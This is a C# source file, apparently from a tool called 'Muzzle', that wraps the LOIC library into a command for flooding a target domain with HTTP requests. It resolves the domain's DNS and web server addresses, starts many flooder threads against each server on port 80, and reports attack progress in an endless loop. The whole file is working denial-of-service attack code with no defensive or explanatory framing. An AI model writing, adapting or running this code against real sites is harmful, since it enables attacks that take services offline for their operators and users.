using LOIC;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Muzzle
{
    internal class FloodHttpCommand
    {
        private static List<IFlooder> arr = new List<IFlooder>();

        public static void Execute(FloodHttpOptions options)
        {
            if (!DomainTools.IsValidTarget(options.Domain))
                return;

            Console.WriteLine($"Target: {options.Domain}");
            Console.WriteLine($"Threads per server: {options.ThreadsPerServer}");

            Console.WriteLine();
            Console.WriteLine("Sniffing DNS servers...");
            var dnsServers = DomainTools.GetDnsServers(options.Domain);
            if (!dnsServers.Any())
            {
                Console.WriteLine("No DNS servers found");
            }
            else
            {
                foreach (var ip in dnsServers)
                {
                    Console.WriteLine(ip);
                }
            }

            Console.WriteLine();
            Console.WriteLine("Sniffing web servers...");
            var webServers = DomainTools.GetHostAddresses(options.Domain, dnsServers);
            if (!webServers.Any())
            {
                Console.WriteLine("No web servers found");
                return;
            }
            else
            {
                foreach (var ip in webServers)
                {
                    Console.WriteLine(ip);
                }
            }

            Console.WriteLine();
            Console.WriteLine($"Attacking {webServers.Count} web servers...");
            Console.WriteLine();

            StartAttack(options.Domain, webServers, options.ThreadsPerServer);

            MonitorProgress();
        }

        private static void MonitorProgress()
        {
            while (true)
            {
                int iIdle = 0;
                int iConnecting = 0, iRequesting = 0, iDownloading = 0;
                int iDownloaded = 0, iRequested = 0, iFailed = 0;

                for (int a = (arr.Count - 1); a >= 0; a--)
                {
                    if (arr[a] != null && (arr[a] is cHLDos))
                    {
                        cHLDos c = arr[a] as cHLDos;

                        iDownloaded += c.Downloaded;
                        iRequested += c.Requested;
                        iFailed += c.Failed;
                        if (c.State == ReqState.Ready ||
                            c.State == ReqState.Completed)
                            iIdle++;
                        if (c.State == ReqState.Connecting)
                            iConnecting++;
                        if (c.State == ReqState.Requesting)
                            iRequesting++;
                        if (c.State == ReqState.Downloading)
                            iDownloading++;
                    }
                }

                Console.WriteLine($"Idle: {iIdle}; Connecting: {iConnecting}; Requesting: {iRequesting}; Requested: {iRequested}; Downloading: {iDownloading}; Downloaded: {iDownloaded}; Failed: {iFailed}");

                Thread.Sleep(3000);
            }
        }

        private static void StartAttack(string host, List<IPAddress> ipAddresses, int threadsPerServer)
        {
            var url = new Uri($"http://{host}");
            var hostOnly = url.GetLeftPart(UriPartial.Authority);
            var pathAndQuery = url.PathAndQuery;

            for (int i = 0; i < threadsPerServer; i++)
            {
                foreach (var ip in ipAddresses)
                {
                    var ts = new HTTPFlooder(hostOnly, ip.ToString(), 80, pathAndQuery, true, 0, 2, true, true, true);
                    ts.Start();
                    arr.Add(ts);
                }
            }
        }
    }
}
